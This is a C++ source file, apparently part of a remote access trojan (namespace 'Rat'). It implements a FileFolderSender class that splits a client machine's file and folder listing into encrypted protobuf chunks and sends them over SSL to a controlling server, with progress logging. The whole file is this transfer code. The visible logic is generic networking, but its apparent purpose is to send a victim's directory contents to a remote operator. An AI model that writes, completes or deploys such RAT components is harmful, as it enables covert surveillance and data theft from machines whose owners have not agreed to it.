// FileFolderSender.cpp
#include "FileFolderSender.hpp"
#include <iostream>
#include <ctime>
#include <cmath>

namespace Rat
{
    FileFolderSender::FileFolderSender(std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> socket,
                                       NetworkManager& networkManager,
                                       const uint64_t& client_id,
                                       const std::string& file_folder_data)
        : socket_(std::move(socket)),
          networkManager_(networkManager),
          client_id_(client_id),
          file_folder_data_(file_folder_data)
    {
    }

    void FileFolderSender::sendFileFolders(const std::string& data_id,
                                           std::function<void()> on_finish,
                                           std::function<void()> on_disconnect)
    {
        data_id_ = data_id;
        on_finish_ = std::move(on_finish);
        on_disconnect_ = std::move(on_disconnect);

        if (!socket_ || !socket_->lowest_layer().is_open() || !socket_->next_layer().is_open())
        {
            std::cerr << "[" << std::time(nullptr) << "] Socket not ready, need to reconnect\n";
            if (on_disconnect_)
                on_disconnect_();
            return;
        }

        total_chunks_ = (file_folder_data_.size() + CHUNK_SIZE - 1) / CHUNK_SIZE;
        sequence_ = 0;

        std::cout << "[" << std::time(nullptr) << "] Debug all chunks for file/folder list: " << total_chunks_ << "\n";

        boost::asio::post(networkManager_.get_io_context(), [this]()
        {
            processNextChunk();
        });
    }

    void FileFolderSender::processNextChunk()
    {
        if (sequence_ >= total_chunks_)
        {
            std::cout << "[" << std::time(nullptr) << "] Finished sending file/folder list: " << data_id_ << "\n";
            if (on_finish_)
                on_finish_();
            return;
        }

        size_t start = sequence_ * CHUNK_SIZE;
        size_t end = std::min(start + CHUNK_SIZE, file_folder_data_.size());
        std::string chunk_data = file_folder_data_.substr(start, end - start);

        if (chunk_data.empty())
        {
            std::cout << "[" << std::time(nullptr) << "] Finished sending file/folder list: " << data_id_ << "\n";
            if (on_finish_)
                on_finish_();
            return;
        }

        rat::Packet packet;
        packet.set_type(rat::Packet::LIST_FILES_FOLDERS);
        packet.set_packet_id(std::to_string(sequence_));
        packet.set_source_id("client_" + std::to_string(client_id_));
        packet.set_destination_id("server_0");
        packet.set_encrypted(true);

        auto* chunk = packet.mutable_chunked_data();
        chunk->set_data_id(data_id_);
        chunk->set_sequence_number(sequence_);
        chunk->set_total_chunks(total_chunks_);
        chunk->set_payload(chunk_data);
        chunk->set_success(true);

        std::cout << "[" << std::time(nullptr) << "] Debug sending file/folder chunk: " << sequence_ + 1 << " / " << total_chunks_
                  << " (" << ((sequence_ + 1) / float(total_chunks_)) * 100 << "%)\n";

        networkManager_.send(socket_, packet, [this](const boost::system::error_code& ec)
        {
            if (ec)
            {
                std::cerr << "[" << std::time(nullptr) << "] Send failed: " << ec.message() << "\n";
                if (on_disconnect_)
                    on_disconnect_();
                return;
            }

            sequence_++;
            boost::asio::post(networkManager_.get_io_context(), [this]()
            {
                processNextChunk();
            });
        });
    }
} // namespace Rat